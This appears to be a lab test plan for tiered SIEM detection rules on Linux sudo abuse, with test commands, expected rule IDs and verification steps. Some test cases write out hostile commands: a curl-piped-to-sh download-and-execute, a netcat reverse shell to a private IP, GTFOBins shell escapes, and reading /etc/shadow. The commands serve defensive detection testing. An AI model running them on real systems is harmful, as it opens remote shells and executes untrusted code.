# Detection 008 — Privilege Escalation / Sudo Abuse

**Rules:** 100520 (Tier 1 baseline), 100521 (Tier 2 watchlist), 100522/100523/100524 (Tier 3 high-confidence), 100525 (repeated sudo failures)
**MITRE:** T1548.003 (Sudo and Sudo Caching), T1078, T1059.004, T1105
**Platform:** Linux (vm2)

## Design principle

Sudo activity is not treated as binary malicious/benign:

```
Sudo activity
  ↓
context
  ↓
user
  ↓
command
  ↓
expected? → log only (Tier 1/2)
suspicious? → escalate (Tier 3)
```

## Tier 1 — Baseline visibility (100520)

### Test Case 1.1
```bash
sudo ls /root
```
**Expected:** only **100520** fires.

## Tier 2 — Watchlist commands (100521)

### Test Case 2.1
```bash
sudo visudo -c
```
### Test Case 2.2
```bash
sudo cat /etc/shadow > /dev/null
```
### Test Case 2.3
```bash
sudo systemctl status ssh
```
**Expected (all three):** **100520** + **100521** fire together.

## Tier 3 — High confidence

### Test Case 3.1: Interactive shell spawn (100522)
```bash
sudo su -c "whoami"
```

### Test Case 3.2: GTFOBins shell escape via vim (100523)
```bash
sudo vim -c ':!whoami' -c ':q!'
```

### Test Case 3.3: GTFOBins shell escape via python (100523)
```bash
sudo python3 -c 'import os; os.system("whoami")'
```

### Test Case 3.4: Download-and-execute pattern (100524)
```bash
sudo bash -c "curl -s http://example.com | sh"
```

### Test Case 3.5: Reverse shell pattern (100524)
```bash
sudo bash -c 'nc -e /bin/bash 192.168.34.145 4444' &
sleep 2
sudo kill %1 2>/dev/null
```

**Expected (all five):** **100520** + the relevant Tier 3 rule fire together.

## Repeated sudo failures (100525)

### Test Case 4.1
```bash
sudo -k
sudo ls /root
```
Enter an intentionally wrong password 3 times within ~2 minutes (retry the command between attempts).

**Expected:** rule **100525** fires — "Multiple sudo authentication failures from same source."

## Negative tests — confirm tiers don't over-escalate

### Test Case 5.1: Watchlist term should stay Tier 2, not jump to Tier 3
```bash
sudo crontab -l
```
**Expected:** **100520** + **100521** fire, but NOT 100522/100523/100524.

### Test Case 5.2: Plain sudo stays Tier 1 only
```bash
sudo whoami
```
**Expected:** only **100520** fires.

## Verification

```bash
sudo grep -a "100520\|100521\|100522\|100523\|100524\|100525" /var/ossec/logs/alerts/alerts.json | tail -n 20
```

Live:
```bash
sudo tail -f /var/ossec/logs/alerts/alerts.json | grep -a --line-buffered -E "100520|100521|100522|100523|100524|100525"
```

## Dashboard check

```
rule.id: (100520 OR 100521 OR 100522 OR 100523 OR 100524 OR 100525)
```

## Notes for writeup

Build a results table mapping each test case to the rule(s) it triggered. The negative tests (5.1, 5.2) are the strongest evidence for the writeup — they show the tiered design discriminates risk rather than treating all sudo usage as equally suspicious, which was the explicit design goal.
